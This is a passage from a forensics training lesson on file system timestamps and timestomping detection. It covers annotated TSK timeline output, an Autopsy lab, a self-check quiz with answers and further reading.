Tue Jan 01 2019 00:00:00  4000  ma..  ...  "NTFS:/big.bin"                     <-- stomped $SI
Mon Mar 02 2026 00:00:00  44    .a..  ...  "FAT:/DOCS/_lan.txt (deleted)"      <-- access = date only
Mon Mar 02 2026 14:07:30  44    m..b  ...  "FAT:/DOCS/_lan.txt (deleted)"      <-- 2-second resolution
Mon Mar 02 2026 14:07:31  30    ma..  ...  "EXT4:/home/alice/authorized_keys"  <-- touch -d set M and A
Thu Oct 01 2026 08:48:19  4000  ...b  ...  "NTFS:/big.bin"                     <-- born AFTER "modified"
Thu Oct 01 2026 08:48:19  80    macb  ...  "NTFS:/big.bin ($FILE_NAME)"         (only if you drop the '\$' filter)
```

The **Type** column is the MACB flags for that row. A *body file* (the `-m` output) is the standard intermediate format for TSK, Plaso and other timeline tools (Day 21).

### Lab 5: The same evidence in Autopsy (20 min, GUI)

1. **Case → New Case** `LAB-004` in `~/cases/LAB-004/autopsy` (Windows: `C:\Cases\LAB-004\autopsy`).
2. Add `fat.img`, `ntfs.img` and `ext4.img` as **Disk Image** data sources (time zone: UTC). Enable *File Type Identification*, *Extension Mismatch Detector*, *Keyword Search* and *Hash Lookup*.
3. Explore:
   - **File Views → Deleted Files**: `_lan.txt` and `deleteme.txt` should appear.
   - Select `small.txt`: Autopsy shows the `Zone.Identifier` stream as a separate file.
   - **Keyword Search** for `203.0.113.50`. It's found in unallocated space of `ext4.img`.
   - **Tools → Timeline**: find the 2019 event for `big.bin`.
4. Tag `big.bin` as *Notable Item* with the comment "`$SI`/`$FN` mismatch: possible timestomping", and generate an HTML report.

*(This lab hasn't been run in the Autopsy GUI by the author. The underlying TSK results it relies on were verified in Labs 1–4.)*

---

## ✅ Knowledge check

1. Which TSK tool would you use to (a) list file names, (b) show an MFT entry or inode, (c) extract content by inode number?
2. A FAT file shows Modified `14:07:30` but the user swears they saved it at `14:07:31`. Explain.
3. What does the TSK address `64-128-4` mean on NTFS, and why is it interesting?
4. List three indicators that an NTFS file was timestomped.
5. Why can't `icat` recover a deleted file on ext4, and what can you do instead?
6. On ext4, what's the difference between `ctime` and `crtime`?
7. A file's Born time is later than its Modified time. Name an innocent explanation and a suspicious one.
8. What extra step do FAT timestamps need before they go into a UTC timeline?
9. What's the difference between `-o` in TSK and `-O` in fatcat?

<details>
<summary><b>Answers</b></summary>

1. (a) `fls` (b) `istat` (c) `icat`.
2. FAT stores the modified time with 2-second resolution, so :31 is stored as :30.
3. MFT entry 64, attribute type 128 (`$DATA`), attribute ID 4: a second, *named* data stream, i.e. an **Alternate Data Stream** (e.g., `Zone.Identifier`, the Mark of the Web, or hidden data).
4. Any three of: `$SI` times earlier than `$FN` times; `$SI` Modified/Created with zero sub-seconds; `$SI` Modified earlier than `$SI` Created without a copy explanation; a `$SI` *MFT Modified* time that doesn't fit; `$UsnJrnl` showing a `BASIC_INFO_CHANGE` at the attack time (Day 10).
5. When the kernel deletes the file, it sets the inode size to 0 and clears the extents, so there's nothing for `icat` to follow. Search or carve unallocated space (`blkls | grep`, Days 7–8), or try journal-based recovery (Day 35).
6. `ctime` = inode **changed** (metadata or content). `crtime` = **birth/creation** time (ext4 only).
7. Innocent: the file was **copied** or extracted, keeping its original modified time. Suspicious: **timestomping** (setting M to an older date to blend in).
8. Find out the time zone of the device that wrote them and convert from **local time** to UTC. exFAT records a UTC offset; FAT doesn't.
9. TSK's `-o` is a partition offset in **sectors**. fatcat's `-O` is an offset in **bytes** (sectors × sector size).

</details>

---

## 📚 Further reading

- Brian Carrier, *File System Forensic Analysis*: chapters 8–10 (FAT), 11–13 (NTFS), 14–15 (Ext2/3); still the reference
- SANS poster *Windows Forensic Analysis*: the "Windows Time Rules" section
- Hal Pomeranz, *Understanding EXT4 (Part 1–5)* (SANS DFIR blog), on ext4 timestamps, extents and deletion
- Joakim Schicht's NTFS tools and research on `$SI`/`$FN` timestamp behaviour
- The Sleuth Kit wiki: https://wiki.sleuthkit.org (tool man pages and the body file format)
- Autopsy User Guide: https://sleuthkit.org/autopsy/docs/user-docs/latest/
- Apple, *Apple File System Reference* (PDF), for APFS internals

---

## ⏭️ Tomorrow: Day 05

**Disk acquisition: physical vs logical, write blockers, raw/E01/AFF4**. Tools: **FTK Imager**, **Guymager**, **dc3dd**.
We'll image a disk the forensically sound way, with hashing and verification built in, and look at what to do when the drive has bad sectors, HPA/DCO or encryption.

---

<sub>Part of the <a href="../README.md">DFIR Daily</a> series · <a href="../CURRICULUM.md">Full 60-day curriculum</a> · For educational and authorised use only.</sub>
